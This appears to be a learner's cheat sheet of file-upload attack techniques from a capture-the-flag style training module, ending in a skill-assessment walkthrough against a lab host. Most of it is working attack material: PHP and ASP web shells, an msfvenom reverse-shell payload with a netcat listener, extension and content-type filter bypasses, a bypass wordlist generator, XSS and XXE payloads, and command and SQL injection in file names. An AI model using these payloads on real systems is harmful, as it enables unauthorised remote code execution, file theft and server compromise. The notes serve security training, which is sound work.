Find out hostname word
<?php system('hostname'); ?>

Web Shell - PHP
https://github.com/Arrexel/phpbash
/opt/useful/SecLists/Web-Shells

*********************************************************BYPASSING FILTERS *******************************************
<?php system($_REQUEST['cmd']); ?>. // URL/name.php?cmd=
<% eval request('cmd') %> asp
IF there is front end validation then -> Burp!! just change file name=!!
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
And then in source code read for uploads directory on inspect page (where the file is uploaded).

**Reverse Shell - PHP**
https://github.com/pentestmonkey/php-reverse-shell
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
our machine: nc -lvnp ourPort

**Custom Reverse Shell**
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
(Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the -p flag and specify the output language with the -f flag.)
our machine: nc -lvnp ourPort

**BLACKLISTED FILTERS**
Workaround - run from seclists looking for allowed extension (select .png) and run into allowed webshell
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt - fuzzing web extensions
.phar is working


**WHITEHAT FILTERS**
1.Check whitelist extensions
2.Double Extensions**
(htb.phar.jpeg is working)
investigate: Burp-Intruder -> https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt 
3.Reverse Double Extension
Investigate : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
4.Character Injection**
(shell.php%00.jpg) 
    %20
    %0a
    %00
    %0d0a
    /
    .\
    .
    …
    :

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

**TYPE FILTERS**
1.Content-Type
There are two common methods for validating the file content: Content-Type Header or File Content. 
CHecking: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt

2.MIME-Type

shell.jpg.phtml
1.Burp - try to upload double extenstions and catch request
2. Try to test all posible extensions - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
also - php double extensions - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
3. Hint -> only images are allowed errors (phar.png/jpg)
Test content-type - 
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
cat content-type.txt | grep 'image/' > image-content-types.txt
4. At the end add ->GIF8
<?php system($_REQUEST['cmd']); ?>
*************************************************Other -Limited File UploadsS***********************************************
1.XSS
	exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' test.jpg
	exiftool test.jpg

XXE as .svg	
	test.svg
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///../../../../../flag.txt"> ]>
	<svg>&xxe;</svg>

	XML read source code
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
	<svg>&xxe;</svg>
	and decode file to get source code!!
DoS
	Decompression Bomb
************************************************Other file uploads***********************************************
1.Injections in File Name
	file$(whoami).jpg or file`whoami`.jpg or file.jpg||whoami
	file';select+sleep(5);--.jpg
2.  Upload Directory Disclosure
	 *fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code
	 *  forcing error messages -  uploading a file with a name that already exists or sending two identical requests simultaneously or try uploading a file with an overly long name (e.g., 5,000 characters)
3.Windows-specific Attacks
	 https://en.wikipedia.org/wiki/8.3_filename  -Filename convention
	 WEB~.CONF) to overwrite the web.conf
4. Advanced

Skill assessment:
1. Upload on /contact/upload.php simple jpg/png file
2. test it on blacklist and whitelist - can bypass php extention filter.pht,.phar,.pgif,.phtm
3. upload:
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
	<svg>&xxe;</svg>
+ decode it - find out destination folder/file before storing (./user_feedback_submissions/) , ymd = yearmonthday
/contact/user_feedback_submissions/ 
fileName = 240219_test.phar.jpg
4. Final - http://83.136.254.199:31843/contact/user_feedback_submissions/240219_test.phar.jpg?cmd=cat%20../../../../../flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt


